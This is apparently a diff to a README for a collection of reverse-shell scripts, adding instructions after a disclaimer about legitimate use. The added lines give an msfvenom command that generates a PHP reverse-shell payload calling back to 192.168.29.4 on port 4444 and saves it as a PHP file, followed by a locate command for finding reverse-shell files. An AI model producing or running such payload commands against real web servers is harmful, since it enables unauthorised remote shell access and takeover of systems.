@@ -8,3 +8,13 @@ However, I am sharing it here to provide others with access to these scripts, wh
 
 It is important to note that these scripts should only be used for legitimate purposes, such as remote administration of systems or troubleshooting.
 Any misuse of these scripts is strictly prohibited and may result in legal consequences.
+
+
+# Generate custom shell
+
+msfvenom -p php/reverse_php lport=4444 lhost=192.168.29.4 > ./php_reverse_shell.php
+
+
+# Find shell into local system
+
+locate reverse | grep php
